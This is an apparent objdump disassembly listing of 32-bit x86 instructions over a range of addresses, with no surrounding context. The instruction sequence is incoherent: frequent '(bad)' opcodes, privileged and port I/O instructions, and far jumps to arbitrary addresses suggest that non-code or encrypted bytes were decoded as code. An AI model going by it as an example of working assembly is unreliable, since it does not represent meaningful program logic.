  4116c4:	ds stos BYTE PTR es:[edi],al
  4116c6:	pop    ebx
  4116c7:	xor    BYTE PTR [edi-0x4c],0xf4
  4116cb:	or     al,0x75
  4116cd:	jns    0x4116bd
  4116cf:	add    DWORD PTR [edx],ebx
  4116d1:	pop    esp
  4116d2:	jbe    0x411713
  4116d4:	int    0xba
  4116d6:	adc    esi,eax
  4116d8:	jmp    0x3bd7e8f0
  4116dd:	or     eax,DWORD PTR [edx+eiz*4]
  4116e0:	pop    DWORD PTR ds:0xfd18b1d7
  4116e6:	cmp    al,0x33
  4116e8:	pop    ebx
  4116e9:	or     al,0xd3
  4116eb:	pop    es
  4116ec:	lahf   
  4116ed:	mov    eax,ds:0x965f5978
  4116f2:	adc    eax,0x2e28c49
  4116f7:	lock (bad) 
  4116f9:	gs pop ss
  4116fb:	enter  0x972b,0x47
  4116ff:	xchg   esi,eax
  411700:	push   eax
  411701:	addr16 aad 0xb
  411704:	into   
  411705:	lods   eax,DWORD PTR ds:[esi]
  411706:	iret   
  411707:	das    
  411708:	cmp    BYTE PTR [eax-0x5c],bh
  41170b:	sbb    dh,bh
  41170d:	xor    DWORD PTR [ecx+0x2f],edx
  411710:	sbb    bl,BYTE PTR [ebp+0x22]
  411713:	adc    edx,DWORD PTR [edi-0x5b]
  411716:	mov    esp,0x6e4e0b54
  41171b:	sbb    edi,ecx
  41171d:	call   0xedb13a18
  411722:	test   BYTE PTR [ecx-0x740a5848],cl
  411728:	jno    0x4116c9
  41172a:	xchg   esp,eax
  41172b:	in     eax,dx
  41172c:	xor    DWORD PTR [esi-0x634ea432],esp
  411732:	out    dx,eax
  411733:	push   edi
  411734:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411735:	sahf   
  411736:	pop    edi
  411737:	aaa    
  411738:	mov    al,ds:0xbb6903f3
  41173d:	lods   al,BYTE PTR ds:[esi]
  41173e:	jnp    0x4116d7
  411740:	sbb    DWORD PTR [ebp-0x21a7263a],0xfffffff3
  411747:	popf   
  411748:	loopne 0x41175a
  41174a:	dec    eax
  41174b:	retf   0x8e9b
  41174e:	jbe    0x4117b9
  411750:	call   0xadd4:0xbd8ac7bc
  411757:	bound  ecx,QWORD PTR [edi-0x304601c6]
  41175d:	shr    BYTE PTR [esi],1
  41175f:	push   ds
  411760:	adc    esp,DWORD PTR [esi-0x73]
  411763:	push   edi
  411764:	fiadd  DWORD PTR [edx-0x68c0ad68]
  41176a:	mov    esi,0x96236798
  41176f:	mov    DWORD PTR [edi],edx
  411771:	jb     0x41173b
  411773:	cmp    dh,dl
  411775:	dec    ebp
  411776:	scas   eax,DWORD PTR es:[edi]
  411777:	push   0x4bb5f8d0
  41177c:	imul   ebx,ebx,0xffffffe3
  41177f:	into   
  411780:	jo     0x411743
  411782:	in     al,dx
  411783:	call   0x2dabbdd4
  411788:	add    ecx,0x50
  41178b:	aas    
  41178c:	imul   ebp,ecx,0xffffffc8
  41178f:	mov    DWORD PTR [eax+ebx*8+0xa4be41c],edi
  411796:	xor    al,0xb1
  411798:	popa   
  411799:	iret   
  41179a:	dec    ebp
  41179b:	fbstp  TBYTE PTR [ebp+0x1d]
  41179e:	cli    
  41179f:	test   BYTE PTR [ebx-0x62],dl
  4117a2:	push   ecx
  4117a3:	sbb    edi,DWORD PTR [ebp+0xb]
  4117a6:	(bad)  
  4117a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117a8:	(bad)  
  4117a9:	aad    0x9d
  4117ab:	add    eax,0xa91c8b17
  4117b0:	daa    
  4117b1:	pop    ebx
  4117b2:	aaa    
  4117b3:	les    edx,FWORD PTR [ebx]
  4117b5:	fisttp DWORD PTR [eax-0x53c630d6]
  4117bb:	sbb    BYTE PTR [ebx+0x41],bh
  4117be:	push   edi
  4117bf:	shl    BYTE PTR [eax],cl
  4117c1:	(bad)  [ebx+eiz*1+0x3]
  4117c5:	(bad)  
  4117c7:	cmc    
  4117c8:	pop    edi
  4117c9:	xchg   ecx,eax
  4117ca:	clc    
  4117cb:	inc    ebx
  4117cc:	inc    edx
  4117cd:	(bad)  
  4117ce:	sahf   
  4117cf:	aas    
  4117d0:	int3   
  4117d1:	out    dx,al
  4117d2:	inc    esi
  4117d3:	mov    al,ah
  4117d5:	je     0x4117e3
  4117d7:	ds cdq 
  4117d9:	les    esi,FWORD PTR [edx-0xf]
  4117dc:	dec    ebp
  4117dd:	sbb    eax,0xbd6457d6
  4117e2:	mov    ah,0x3a
  4117e4:	jmp    0x12483a51
  4117e9:	sub    BYTE PTR [esi],bh
  4117eb:	inc    esi
  4117ec:	mov    ebx,0x6865bc8b
  4117f1:	les    esi,FWORD PTR [ecx+0x55]
  4117f4:	pushf  
  4117f5:	and    al,0x9f
  4117f7:	test   DWORD PTR [esi+0x5],eax
  4117fa:	lock xor ch,bl
  4117fd:	and    eax,0x4782ed38
  411802:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411803:	lahf   
  411804:	add    al,0xb3
  411806:	cmp    eax,0xb111a840
  41180b:	dec    edi
  41180c:	pop    edx
  41180d:	pop    ss
  41180e:	aas    
  41180f:	dec    ebp
  411810:	pop    edx
  411811:	in     al,0x86
  411813:	jnp    0x4117a2
  411815:	pop    ss
  411816:	and    esp,esi
  411818:	mov    al,0x7
  41181a:	shl    DWORD PTR [esi],cl
  41181c:	mov    bl,0x82
  41181e:	scas   al,BYTE PTR es:[edi]
  41181f:	leave  
  411820:	cmp    esi,DWORD PTR [edi+0x31ee4090]
  411826:	shl    BYTE PTR [esp+ecx*2+0x22],1
  41182a:	push   ebp
  41182c:	popa   
  41182d:	daa    
  41182e:	jp     0x41184d
  411830:	pusha  
  411831:	loop   0x41188a
  411833:	mov    dl,0xfc
  411835:	mov    esp,0x998eccc
  41183a:	sbb    DWORD PTR [edi-0x381f34eb],esi
  411840:	jb     0x411805
  411842:	dec    ebx
  411843:	outs   dx,DWORD PTR ds:[esi]
  411844:	add    DWORD PTR [edi],ebp
  411846:	es cmp al,0xcf
  411849:	adc    BYTE PTR [esi+0x2436b0de],ch
  41184f:	xor    ecx,ebp
  411851:	fcmovu st,st(1)
  411853:	fiadd  WORD PTR [ebp+0x3fa74011]
  411859:	fcomi  st,st(6)
  41185b:	loopne 0x4117f7
  41185d:	sbb    al,0xf9
  41185f:	out    dx,eax
  411860:	cmp    al,0x16
  411862:	add    DWORD PTR [ebp-0x71],0x7f
  411866:	jecxz  0x41188f
  411868:	scas   al,BYTE PTR es:[edi]
  411869:	fild   WORD PTR [eax]
  41186b:	sub    BYTE PTR [eax+0x5b],cl
  41186e:	jle    0x41182e
  411870:	pop    ebp
  411871:	cmp    eax,0x170360f9
  411876:	jbe    0x411881
  411878:	xchg   edi,eax
  411879:	xchg   BYTE PTR [esi+0x4c],dh
  41187c:	and    BYTE PTR [edx-0x2744ce0f],dh
  411882:	dec    ebx
  411883:	sub    cl,0xfd
  411886:	inc    ebx
  411887:	or     DWORD PTR [edi],0x8e0c5eee
  41188d:	sbb    edx,DWORD PTR [edi]
  41188f:	daa    
  411890:	iret   
  411891:	sub    DWORD PTR [ebx],ebx
  411893:	xchg   edi,eax
  411894:	mov    dl,0xd
  411896:	cli    
  411897:	addr16 mov ds,edx
  41189a:	fisub  WORD PTR [ebx-0xcb5ee85]
  4118a0:	in     al,dx
  4118a1:	arpl   WORD PTR [ebp-0x313649a8],bp
  4118a7:	jmp    0x253f51ae
  4118ac:	dec    ecx
  4118ad:	adc    al,0x27
  4118af:	adc    BYTE PTR ds:0x83f65919,ch
  4118b5:	sbb    al,0xff
  4118b7:	shl    ch,cl
  4118b9:	sub    bh,ch
  4118bb:	repnz sub BYTE PTR ss:[ecx],0x6b
  4118c0:	jge    0x4118a7
  4118c2:	inc    edx
  4118c3:	inc    esi
  4118c4:	and    DWORD PTR [edx-0x4f4d8042],ecx
  4118ca:	jb     0x411946
  4118cc:	jnp    0x41188a
  4118ce:	jmp    0x411899
  4118d0:	popf   
  4118d1:	jmp    0xbbaff7ce
  4118d6:	mov    edx,DWORD PTR ds:0xf47eb3b1
  4118dc:	pusha  
  4118dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118de:	push   ebp
  4118df:	inc    ebx
  4118e0:	shl    esp,cl
  4118e2:	je     0x411897
  4118e4:	test   DWORD PTR [edi+eiz*2-0x2fde136a],esp
  4118eb:	popf   
  4118ec:	aas    
  4118ed:	mov    ebx,0x3e9e5b25
  4118f2:	(bad)  
  4118f3:	fdiv   DWORD PTR [edi+eax*2]
  4118f6:	cmc    
  4118f7:	int3   
  4118f8:	repnz in eax,dx
  4118fa:	div    cl
  4118fc:	inc    ebx
  4118fd:	sbb    eax,0xbf9f4fb6
  411902:	fimul  WORD PTR [ebx]
  411904:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411905:	xchg   ebx,eax
  411906:	ins    BYTE PTR es:[edi],dx
  411907:	lahf   
  411908:	and    BYTE PTR [edi-0x1809d706],ch
  41190e:	(bad)  
  41190f:	jecxz  0x4118ce
  411911:	xchg   ebp,eax
  411913:	pusha  
  411914:	mov    dh,0xc4
  411916:	xchg   edx,eax
  411917:	scas   al,BYTE PTR es:[edi]
  411918:	cmp    BYTE PTR [eax],dh
  41191a:	popf   
  41191b:	push   es
  41191c:	xchg   esp,eax
  41191d:	jmp    0xec07:0x1fa9463b
  411924:	addr16 std 
  411926:	jno    0x411916
  411928:	shl    BYTE PTR [ecx+0x6d],cl
  41192b:	xchg   esp,eax
  41192c:	inc    eax
  41192d:	xchg   ebp,eax
  41192e:	es mov esi,0xfc096e3e
  411934:	adc    eax,0x79416018
  411939:	loopne 0x411908
  41193b:	test   BYTE PTR [esi+0xff54bb2],0x5e
  411942:	inc    ecx
  411943:	mov    esp,DWORD PTR [ebp+0x7383a69f]
  411949:	sbb    ch,cl
  41194b:	mov    eax,0x5aec67d4
  411950:	mov    esp,ecx
  411952:	adc    bl,al
  411954:	adc    esi,DWORD PTR [ebx-0x29]
  411957:	sbb    DWORD PTR ds:0xcf46de82,eax
  41195d:	jne    0x411975
  41195f:	or     eax,0xe6f3950c
  411964:	aam    0x4c
  411966:	xor    ebp,ecx
  411968:	sub    bl,BYTE PTR [ebx*1-0x12f62357]
  41196f:	jnp    0x4118f2
  411971:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411972:	pop    es
  411973:	sti    
  411974:	cdq    
  411975:	fstp   TBYTE PTR [edx-0x7d]
  411978:	add    eax,0xfd6b45d1
  41197d:	and    al,BYTE PTR [ebx+0x4eb96b63]
  411983:	pop    eax
  411984:	ret    0xcb93
  411987:	lods   eax,DWORD PTR ds:[esi]
  411988:	fucomp st(7)
  41198a:	lahf   
  41198b:	push   ebp
  41198c:	mov    ds,edx
  41198e:	aam    0xa1
  411990:	jecxz  0x411975
  411992:	mov    dh,0x7c
  411994:	les    edi,FWORD PTR ds:0x7f917011
  41199a:	leave  
  41199b:	into   
  41199c:	sti    
  41199d:	push   ebx
  41199e:	sub    al,0x74
  4119a0:	mov    gs,WORD PTR [ebx-0x23]
  4119a3:	mov    WORD PTR [ecx+0x37bd17f9],es
  4119a9:	push   cs
  4119aa:	loope  0x411977
  4119ac:	scas   al,BYTE PTR es:[edi]
  4119ad:	jge    0x4119ad
  4119af:	je     0x4119f2
  4119b1:	pop    esp
  4119b2:	jecxz  0x4119a5
  4119b4:	jns    0x41196d
  4119b6:	dec    ecx
  4119b7:	int3   
  4119b8:	stos   DWORD PTR es:[edi],eax
  4119b9:	push   ebx
  4119ba:	jns    0x41198d
  4119bc:	push   ebx
  4119bd:	push   ecx
  4119be:	mov    al,0xd5
  4119c0:	shl    DWORD PTR [edi+0x161060b],0xd3
  4119c7:	fcmovne st,st(7)
  4119c9:	fnstcw WORD PTR [eax+0x19]
  4119cc:	sbb    eax,0xd7903821
  4119d1:	popa   
  4119d2:	or     BYTE PTR [edi+0x52],bl
  4119d5:	iret   
  4119d6:	jae    0x411a17
  4119d8:	push   0x2a7a229e
  4119dd:	(bad)  
  4119de:	adc    eax,0xcd13d733
  4119e3:	push   0x956626bc
  4119e8:	cmc    
  4119e9:	add    eax,0x4afb6dd6
  4119ee:	mov    bh,0xbb
  4119f0:	fadd   DWORD PTR [esi]
  4119f2:	ret    
  4119f3:	scas   al,BYTE PTR es:[edi]
  4119f4:	mov    eax,ds:0x37af1933
  4119f9:	push   ecx
  4119fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119fb:	push   ds
  4119fc:	fmulp  st(3),st
  4119fe:	xor    BYTE PTR [edx+0x11c05108],bl
  411a04:	rol    cl,1
  411a06:	mov    WORD PTR [esi+edi*2-0x38],cs
  411a0a:	or     DWORD PTR [eax+0x3],ecx
  411a0d:	jge    0x4119f4
  411a0f:	sbb    bh,ah
  411a11:	int    0x5e
  411a13:	popf   
  411a14:	push   edi
  411a15:	out    0xbb,al
  411a17:	sahf   
  411a18:	lea    edi,[ecx]
  411a1a:	push   ebx
  411a1b:	fild   DWORD PTR [ebx-0x64e89802]
  411a21:	sub    eax,0xa032c136
  411a26:	jmp    0x411a50
  411a28:	out    dx,eax
  411a29:	xor    eax,DWORD PTR [esi-0x7a]
  411a2c:	stos   DWORD PTR es:[edi],eax
  411a2d:	js     0x411a17
  411a2f:	lahf   
  411a30:	aaa    
  411a31:	imul   DWORD PTR [edi]
  411a33:	pop    edx
  411a34:	das    
  411a35:	sub    bl,dh
  411a37:	push   0x31
  411a39:	js     0x411a15
  411a3b:	push   eax
  411a3c:	test   DWORD PTR ds:0x9417e54c,ebx
  411a42:	push   esi
  411a43:	scas   al,BYTE PTR es:[edi]
  411a44:	test   al,0xb0
  411a46:	enter  0x371c,0x5f
  411a4a:	loope  0x4119e1
  411a4c:	fsub   QWORD PTR [edi+ecx*1+0x2329e443]
  411a53:	es aad 0x36
  411a56:	and    bl,BYTE PTR [ebx-0x56]
  411a59:	xor    DWORD PTR [eax-0xaf1ac75],ecx
  411a5f:	xlat   BYTE PTR ds:[ebx]
  411a60:	add    ebx,esp
  411a62:	push   esi
  411a63:	mov    eax,DWORD PTR [ebx-0x700e934d]
  411a69:	mov    edi,0xe040e005
  411a6e:	push   cs
  411a6f:	pushf  
  411a70:	dec    ebx
  411a71:	dec    ebx
  411a72:	loope  0x411ad7
  411a74:	cld    
  411a75:	cmp    ecx,DWORD PTR [ebp+ebx*8+0x73]
  411a79:	repnz xor eax,0x5f71d9d5
  411a7f:	scas   eax,DWORD PTR es:[edi]
  411a80:	sbb    al,0x52
  411a82:	push   0x6d00a070
  411a87:	outs   dx,BYTE PTR ds:[esi]
  411a88:	fndisi(8087 only) 
  411a8a:	mov    WORD PTR [ebp-0x4a],fs
  411a8d:	mov    dl,0x74
  411a8f:	mov    al,0x65
  411a91:	test   BYTE PTR [edi*8-0x3c555a26],bl
  411a98:	mov    al,ds:0x872d641d
  411a9d:	shr    DWORD PTR [ebp-0xa380cbc],0x6f
  411aa4:	hlt    
  411aa5:	int3   
  411aa6:	jmp    0x411ad6
  411aa8:	bound  edi,QWORD PTR [esi+0x5889f1db]
  411aae:	cmp    al,0xd7
  411ab0:	cmp    ebx,DWORD PTR [ebx+0x497d9016]
  411ab6:	mov    dh,0x27
  411ab8:	or     al,0x9e
  411aba:	cli    
  411abb:	inc    ebx
  411abc:	jp     0x411a50
  411abe:	or     edi,DWORD PTR [edx+0x6c5171fd]
  411ac4:	sbb    ah,0xc0
  411ac7:	inc    eax
  411ac8:	dec    edx
  411ac9:	sbb    eax,0x1dcbe4c7
  411ace:	ins    BYTE PTR es:[edi],dx
  411acf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ad0:	mov    bh,0x79
  411ad2:	fldenv [eax-0x5df9f150]
  411ad8:	mov    ds:0x6f7ff47f,al
  411add:	(bad)  
  411adf:	mov    al,ds:0x8f1a23a5
  411ae4:	fidiv  DWORD PTR [edx]
  411ae6:	hlt    
  411ae7:	sub    BYTE PTR [eax+0x27da9cb0],bh
  411aed:	imul   ebx,DWORD PTR [ebp-0xc],0xc17a69b0
  411af4:	and    al,0xbd
  411af6:	jno    0x411b1a
  411af8:	test   eax,0x852e1b38
  411afd:	int3   
  411afe:	or     ecx,DWORD PTR [esi-0x75544c61]
  411b04:	stc    
  411b05:	or     DWORD PTR [ebx+0x730feedd],ebp
  411b0b:	dec    ecx
  411b0c:	inc    ecx
  411b0d:	cmp    al,0xdd
  411b0f:	pop    eax
  411b10:	push   0x7ce8e20f
  411b15:	xlat   BYTE PTR ds:[ebx]
  411b16:	test   al,0x90
  411b18:	pop    ds
  411b19:	mov    ah,BYTE PTR ds:0xe1a4ce66
  411b1f:	out    0xd4,eax
  411b21:	sbb    DWORD PTR [edx-0x59],0x6f94d428
  411b28:	mov    eax,ds:0xc0b4ee2a
  411b2d:	sub    eax,DWORD PTR [ebp-0x3f3ffe76]
  411b33:	xchg   esp,eax
  411b34:	push   ebx
  411b35:	xor    DWORD PTR [esi],ebp
  411b37:	loop   0x411b83
  411b39:	rcr    eax,cl
  411b3b:	test   BYTE PTR [ebx+0x773fe84d],0xfc
  411b42:	dec    esi
  411b43:	pushf  
  411b44:	inc    edx
  411b45:	jmp    0x411b75
  411b47:	and    eax,0xbd9e0f98
  411b4c:	popa   
  411b4d:	ins    BYTE PTR es:[edi],dx
  411b4e:	loope  0x411b4d
  411b50:	push   ds
  411b51:	or     eax,0x8eb0bca3
  411b56:	inc    ecx
  411b57:	aas    
  411b58:	inc    ebx
  411b59:	adc    bh,BYTE PTR [edi+0x4104784d]
  411b5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b60:	dec    ebp
  411b61:	sub    bh,ah
  411b63:	data16 jo 0x411b8c
  411b66:	mov    esp,0x55103a19
  411b6b:	mov    edi,0xb98cac63
  411b70:	mov    dl,0xed
  411b72:	xor    dl,cl
  411b74:	std    
  411b75:	adc    al,0x1
  411b77:	or     BYTE PTR [ebx+0x65],0xb8
  411b7b:	sub    ebp,esi
  411b7d:	nop
  411b7e:	dec    edi
  411b7f:	adc    BYTE PTR [ebx+esi*8-0x5d84fd6a],cl
  411b86:	lock lods al,BYTE PTR ds:[esi]
  411b88:	sub    edi,DWORD PTR [ebp+0x5fc3d821]
  411b8e:	test   BYTE PTR [ecx+eax*4+0x27],bl
  411b92:	fwait
  411b93:	inc    eax
  411b94:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  411b96:	cld    
  411b97:	adc    al,0xfb
  411b99:	mov    ecx,0xc51837cb
  411b9e:	and    DWORD PTR [ecx+0xae5e4d1],esp
  411ba4:	sub    dl,BYTE PTR [eax+0x6e634c6d]
  411baa:	dec    ebp
  411bab:	mov    esp,0x5d43d1f6
  411bb0:	mov    dh,0x56
  411bb2:	lods   al,BYTE PTR ds:[esi]
  411bb3:	sahf   
  411bb4:	jp     0x411b70
  411bb6:	(bad)  
  411bb7:	lods   al,BYTE PTR ds:[esi]
  411bb8:	das    
  411bb9:	sub    esi,DWORD PTR [ecx-0x58319949]
  411bbf:	mov    ch,0xb0
  411bc1:	sub    ch,BYTE PTR [eax-0x7c]
  411bc4:	nop
  411bc5:	jmp    0xf78ec36b
  411bca:	jns    0x411c1d
  411bcc:	scas   al,BYTE PTR es:[edi]
  411bcd:	push   0xffffffab
  411bcf:	cmp    eax,0x9a69b76e
  411bd4:	inc    edx
  411bd5:	mov    BYTE PTR [esi-0x58],cl
  411bd8:	jmp    0x411c06
  411bda:	xor    ecx,DWORD PTR [ebp+ebp*1-0x41483e0a]
  411be1:	add    al,0x46
  411be3:	ins    BYTE PTR es:[edi],dx
  411be4:	dec    esp
  411be5:	(bad)  
  411be6:	mov    bh,0xde
  411be8:	fnsave [eax]
  411bea:	popa   
  411beb:	lds    edi,FWORD PTR [ecx]
  411bed:	ja     0x411bc6
  411bef:	add    al,0x39
  411bf1:	sub    eax,0x8d95d550
  411bf6:	xor    eax,0xf1b332e4
  411bfb:	sub    DWORD PTR [ebp-0x43d22f9d],esi
  411c01:	mov    eax,0xe65aa613
  411c06:	xor    edx,DWORD PTR [ebp-0x10]
  411c09:	push   ebp
  411c0a:	inc    eax
  411c0b:	repz jmp 0x42ad:0xcfb76471
  411c13:	rcl    DWORD PTR [esi],0x4
  411c16:	fcom   DWORD PTR [ebp-0x32d2a80d]
  411c1c:	fsubp  st(1),st
  411c1e:	dec    ecx
  411c1f:	call   0xe67a:0x5db4bdeb
  411c26:	stos   DWORD PTR es:[edi],eax
  411c27:	aam    0x91
  411c29:	fcmovb st,st(3)
  411c2b:	lock xchg edi,eax
  411c2d:	int3   
  411c2e:	sbb    eax,0xc7e2364b
  411c33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c34:	rcr    BYTE PTR cs:[esp+edx*2-0xd],cl
  411c39:	data16 ja 0x411c51
  411c3c:	mov    bh,0x3f
  411c3e:	ja     0x411c44
  411c40:	jg     0x411c52
  411c42:	add    cl,BYTE PTR [eax]
  411c44:	rcr    BYTE PTR [esi-0x3df30628],0x57
  411c4b:	scas   al,BYTE PTR es:[edi]
  411c4c:	and    eax,DWORD PTR [esi+0x40]
  411c4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c50:	jl     0x411cc6
  411c52:	push   edi
  411c53:	cli    
  411c54:	xchg   edi,eax
  411c55:	xchg   BYTE PTR [eax-0x1d59fdce],al
  411c5b:	mov    ah,0x81
  411c5d:	leave  
  411c5e:	mov    edx,DWORD PTR [ebp+0x47]
  411c61:	mov    dh,0x3f
  411c63:	scas   al,BYTE PTR es:[edi]
  411c64:	mov    bl,BYTE PTR [edi]
  411c66:	pop    ebp
  411c67:	call   0xc2ab0143
  411c6c:	test   DWORD PTR [ebp-0x18],ebx
  411c6f:	dec    ebx
  411c70:	inc    edx
  411c71:	(bad)  
  411c72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c73:	sub    al,0xbf
  411c75:	clc    
  411c76:	hlt    
  411c77:	add    eax,0xca88444a
  411c7c:	lds    edi,FWORD PTR [ebp+ebx*2-0x1e]
  411c80:	mov    bl,0x6
  411c82:	shr    DWORD PTR [ebx+0x1e],0x60
  411c86:	inc    si
  411c88:	and    ecx,edx
  411c8a:	inc    ebp
  411c8b:	pushf  
  411c8c:	es jo  0x411cf8
  411c8f:	mov    edx,0x3eb3b93a
  411c94:	sbb    eax,ecx
  411c96:	jl     0x411c2b
  411c98:	fiadd  DWORD PTR [edi+0x3d6815f7]
  411c9e:	cmp    BYTE PTR [edi+eax*4],dh
  411ca1:	xchg   ecx,eax
  411ca2:	ja     0x411c87
  411ca4:	mov    ebp,0xabf539df
  411ca9:	rol    DWORD PTR [ebp+0x4c4ba8d8],1
  411caf:	sub    eax,0x8d8639e4
  411cb4:	jns    0x411cb5
  411cb6:	je     0x411cbd
  411cb8:	or     edx,DWORD PTR ds:0x4d120783
  411cbe:	sbb    eax,0x6d2fcaf2
  411cc3:	mov    dh,0xda
  411cc5:	and    al,BYTE PTR [edx]
  411cc7:	jg     0x411ca7
  411cc9:	or     bh,BYTE PTR [edi-0x10]
  411ccc:	pop    es
  411ccd:	shl    DWORD PTR [ebx+0x5e43d25d],1
  411cd3:	iret   
  411cd4:	dec    BYTE PTR [ebx]
  411cd6:	dec    ebx
  411cd7:	jmp    0xc0ce:0x6886727
  411cde:	adc    eax,0xdec7a133
  411ce3:	push   edx
  411ce4:	adc    BYTE PTR ds:0x9bcd394d,cl
  411cea:	retf   
  411ceb:	cmp    eax,0xc8519989
  411cf0:	mov    BYTE PTR [ebx-0x5a9840ff],dl
  411cf6:	imul   esi,esp,0xffffff90
  411cf9:	inc    ebp
  411cfa:	cld    
  411cfb:	mov    dl,0xb4
  411cfd:	jo     0x411ccd
  411cff:	adc    al,0xc4
  411d01:	fsubrp st(2),st
  411d03:	repnz push eax
  411d05:	add    esi,DWORD PTR [eax+edx*2-0x52]
  411d09:	rol    BYTE PTR [ebx-0x7],0xa
  411d0d:	push   ebx
  411d0e:	inc    ch
  411d10:	mov    al,0xad
  411d12:	fs int3 
  411d14:	push   ebx
  411d15:	push   edi
  411d16:	push   ss
  411d17:	cld    
  411d18:	adc    eax,0xbd881db8
  411d1d:	or     DWORD PTR [ecx],0x17cb6a92
  411d23:	adc    eax,0x2e9af080
  411d28:	inc    ebp
  411d29:	pop    ds
  411d2a:	push   ss
  411d2b:	cmp    eax,DWORD PTR [edi+0x2a471550]
  411d31:	sbb    eax,0x36021ca9
  411d36:	in     eax,dx
  411d37:	or     al,0x77
  411d39:	jl     0x411ccb
  411d3b:	fwait
  411d3c:	cwde   
  411d3d:	and    al,0x52
  411d3f:	mov    es,ebx
  411d41:	in     eax,0xfa
  411d43:	sar    BYTE PTR [eax],cl
  411d45:	imul   ebp,DWORD PTR ds:0x998c9181,0x3c24362
  411d4f:	push   ss
  411d50:	cmp    eax,DWORD PTR [ebp+0xcdea7b1]
  411d56:	push   0xeceae929
  411d5b:	in     al,0xa4
  411d5d:	mov    WORD PTR [esi-0x72581b75],ds
  411d63:	jne    0x411cf9
  411d65:	inc    eax
  411d66:	dec    ebx
  411d67:	arpl   WORD PTR [edi],dx
  411d69:	mov    dl,0x1
  411d6b:	mov    ch,0x9d
  411d6d:	jl     0x411d2d
  411d6f:	dec    ecx
  411d70:	inc    edi
  411d71:	add    ch,BYTE PTR [ebx]
  411d73:	dec    ebp
  411d74:	mov    edx,0x52980b9c
  411d79:	cmp    ah,BYTE PTR [edx+0x5e]
  411d7c:	xor    BYTE PTR [eax],al
  411d7e:	pop    esi
  411d7f:	data16 in al,dx
  411d81:	ss jne 0x411de5
  411d84:	std    
  411d85:	lods   eax,DWORD PTR ds:[esi]
  411d86:	mov    ah,0x99
  411d88:	mov    ebp,0x3376b222
  411d8d:	push   ds
  411d8e:	and    BYTE PTR [esi+0x43313b5],al
  411d94:	push   ecx
  411d95:	xor    cl,BYTE PTR [ecx]
  411d97:	mov    edi,DWORD PTR ds:0x500c7d71
  411d9d:	push   esi
  411d9e:	leave  
  411d9f:	sub    edi,edx
  411da1:	gs (bad) 
  411da3:	pusha  
  411da4:	cmp    eax,0xdd7fcd07
  411da9:	cmp    al,0x75
  411dab:	out    0xb6,eax
  411dad:	popa   
  411dae:	dec    esp
  411daf:	or     DWORD PTR [ebx+0x2d35b922],esi
  411db5:	shl    bh,1
  411db7:	jae    0x411d55
  411db9:	jnp    0x411e06
  411dbb:	outs   dx,DWORD PTR ds:[esi]
  411dbc:	outs   dx,DWORD PTR ds:[esi]
  411dbd:	cmp    DWORD PTR [edx+edi*8],eax
  411dc0:	fimul  WORD PTR [edx+0x16f7432a]
  411dc6:	aam    0xe9
  411dc8:	jo     0x411e46
  411dca:	inc    edi
  411dcb:	stos   BYTE PTR es:[edi],al
  411dcc:	sahf   
  411dcd:	sub    esp,esp
  411dcf:	pop    DWORD PTR [esi+eax*8]
  411dd2:	mov    ds:0xe302f259,al
  411dd7:	dec    ecx
  411dd8:	or     eax,0xd5d603db
  411ddd:	sbb    al,0xec
  411ddf:	mov    ebx,0x85d98a71
  411de4:	xchg   ecx,eax
  411de5:	push   ebp
  411de6:	mov    BYTE PTR [ebx*8+0x65256a76],bh
  411ded:	push   0x83faebf7
  411df2:	not    DWORD PTR [ecx-0x33]
  411df5:	dec    esp
  411df6:	cmp    esp,DWORD PTR [edx+0x73c2de96]
  411dfc:	setae  BYTE PTR [edx-0x4265e323]
  411e03:	add    ch,BYTE PTR [eax+0x36]
  411e06:	sbb    dl,0xc6
  411e09:	inc    edx
  411e0a:	(bad)  
  411e0b:	cmc    
  411e0c:	jo     0x411def
  411e0e:	mul    DWORD PTR [ecx-0x3bce65c4]
  411e14:	push   esi
  411e15:	loopne 0x411d9e
  411e17:	call   0x74864b30
  411e1c:	mov    edx,?
  411e1e:	push   0x3a
  411e20:	or     DWORD PTR [ebx+0x20],0x5d
  411e24:	push   esi
  411e25:	xor    ebx,DWORD PTR [edx-0xa]
  411e28:	scas   eax,DWORD PTR es:[edi]
  411e29:	mov    edi,0xb963cbb7
  411e2e:	cmp    bh,BYTE PTR [eax]
  411e30:	cmp    DWORD PTR [eax],esi
  411e32:	sar    BYTE PTR [esi+0x3b],0xf2
  411e36:	fmul   DWORD PTR [ebx]
  411e38:	and    al,0x34
  411e3a:	sar    DWORD PTR [esi],cl
  411e3c:	(bad)  [esp+edi*8+0x710488ba]
  411e43:	clc    
  411e44:	xchg   esi,eax
  411e45:	push   ecx
  411e46:	or     bh,BYTE PTR [edx-0x4b317ccd]
  411e4c:	mov    cl,ch
  411e4e:	mov    DWORD PTR [ebx],eax
  411e50:	scas   al,BYTE PTR es:[edi]
  411e51:	or     dh,BYTE PTR [ebx]
  411e53:	test   BYTE PTR ds:0x66382feb,cl
  411e59:	mov    ds:0x588ed7ca,eax
  411e5e:	xor    al,0xd2
  411e60:	xchg   ebx,eax
  411e61:	rcl    bl,cl
  411e63:	fucomi st,st(5)
  411e65:	push   ecx
  411e66:	dec    edi
  411e67:	mov    ds:0x8e49a7cd,al
  411e6c:	bnd ret 
  411e6e:	push   ebp
  411e6f:	push   ebp
  411e70:	clc    
  411e71:	mov    ebp,0x8ba9c07a
  411e76:	mov    eax,ds:0x1cc2289d
  411e7b:	adc    eax,0x666622e4
  411e80:	pop    es
  411e81:	adc    BYTE PTR [ebx-0x45],0x1f
  411e85:	mov    ebx,0xdbb7dcd9
  411e8a:	repz cmp eax,0x3d481000
  411e90:	aas    
  411e91:	jg     0x411e9e
  411e93:	jbe    0x411e2b
  411e95:	jb     0x411ebd
  411e97:	mov    ebx,0xc6859c3e
  411e9c:	pop    ecx
  411e9d:	daa    
  411e9e:	push   0xd278a59c
  411ea3:	add    al,0x5a
